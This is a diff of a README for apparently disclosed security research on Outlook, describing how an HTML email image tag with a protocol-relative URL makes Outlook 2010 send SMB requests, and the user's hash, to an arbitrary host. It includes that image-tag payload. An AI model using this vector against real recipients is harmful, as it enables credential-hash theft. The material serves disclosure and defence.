@@ -20,7 +20,7 @@ While I was working on an assessment, I received an HTML email in Outlook 2010 t
 <img src="//example.com/test/image.jpg" >
 ```
 
-I could see that Outlook was searching for something after opening that email and it took longer than usual to fully open it. I quickly realised that Outlook actually used the URL as “\\example.com\test\image.jpg” and sent “example.com” a SMB request.
+I could see that Outlook was searching for something after opening that email and it took longer than usual to fully open it. I quickly realised that Outlook actually used the URL as `\\example.com\test\image.jpg` and sent `example.com` a SMB request.
 
 Although it did not load the image even when the provided SMB path was valid, it could send my SMB hash to an arbitrary location. This attack did not work on Outlook 2016, however it made me start a small research project in trying different HTML tags that accept URIs with different URI schemes and special payloads.
 
@@ -39,7 +39,7 @@ or more details and the fix, please refer to https://www.nccgroup.trust/uk/our-r
 ### Identified payloads:
 
 #### Remote Calls:
-Although the “\\” pattern was blocked by Outlook, a number of other patterns and URI schemes were found that forced Outlook to send requests to remote servers.
+Although the `\\` pattern was blocked by Outlook, a number of other patterns and URI schemes were found that forced Outlook to send requests to remote servers.
 The following table shows the identified vectors:
 
 ![Outlook Remote Calls](https://github.com/nccgroup/OutlookLeakTest/blob/master/images/remotecalls.png?raw=true)
